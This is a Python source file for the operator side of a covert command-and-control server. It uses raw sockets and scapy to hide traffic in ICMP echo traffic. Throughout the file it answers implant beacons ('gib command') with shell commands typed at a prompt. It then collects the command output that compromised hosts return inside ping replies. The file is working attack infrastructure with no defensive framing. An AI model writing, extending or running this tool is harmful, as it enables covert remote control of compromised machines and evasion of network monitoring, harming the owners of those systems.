#!/home/joe/.venv/bin/python3
import json
from multiprocessing import Queue, Process
from scapy.packet import Packet
from scapy.layers.inet import IP, ICMP
from socket import *
from threading import Thread

BUFFER = bytearray(2**16)
TIMEOUT = 1.0

cq = Queue()  # command queue
oq = Queue()  # output queue


# handles replying to the beacon
def reply(request: Packet) -> bytes:
    body = request[ICMP].load

    try:
        obj = json.loads(body)
        obj["ip"] = request[IP].src
        oq.put(obj)
        return "valid json output recieved".encode("utf-8")

    except json.JSONDecodeError:
        if body == "gib command".encode("utf-8"):
            if cq.empty():
                return "rem".encode("utf-8")
            else:
                return cq.get()

    except Exception as e:
        print(f"error replying: {e}")
        return "error".encode("utf-8")


# handles packets and communication
def worker(
    s: SocketType,
) -> None:
    # take responsibility for the ip header
    s.setsockopt(SOL_IP, IP_HDRINCL, 1)

    # main loop
    while True:
        # receive packet
        s.settimeout(None)
        recv = s.recvfrom_into(BUFFER, len(BUFFER))
        size = recv[0]
        address = recv[1]

        # parse packet
        p: Packet = IP(BUFFER[:size])

        if not p.haslayer(ICMP):
            raise Exception("Not an ICMP packet")

        # if packet is icmp echo request
        if p[ICMP].type == 8:
            # change body
            p[ICMP].load = reply(p)

            # swap src and dst
            p.dst, p.src = p.src, p.dst

            # change icmp type to echo reply
            p[ICMP].type = 0

            # remove checksum (scapy will recalculate)
            p[ICMP].chksum = None

            # send packet
            try:
                s.settimeout(TIMEOUT)
                s.sendto(bytes(p), address)
            except OSError as e:
                if e.errno == 90:
                    pass  # this means packet size is bigger than mtu
                raise e


def printer() -> None:
    while True:
        if not oq.empty():
            # get output from queue
            output: dict = oq.get()
            ip = output.pop("ip", None)
            
            for k, v in output.items():
                # if value is a list, join it
                if (k == "stdout" or k == "stderr") and v != '':
                    v.encode("utf-8").decode("unicode_escape")
                    print(f"{ip} {k}:")
                    for line in v.splitlines():
                        print(f"\t{line}")
            
            print('$ ', end='', flush=True)


if __name__ == "__main__":
    s: SocketType = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)

    w = Process(target=worker, args=(s,))
    w.start()

    p = Process(target=printer, args=())
    p.start()

    try:
        while True:

            # get command from stdin
            command = input("$ ").strip()

            # if command is empty, skip
            if not command:
                continue

            # put command in queue
            cq.put(command.encode("utf-8"))

    except KeyboardInterrupt:
        pass

    except Exception as e:
        raise e

    finally:
        w.kill()
        p.kill()
        s.close()
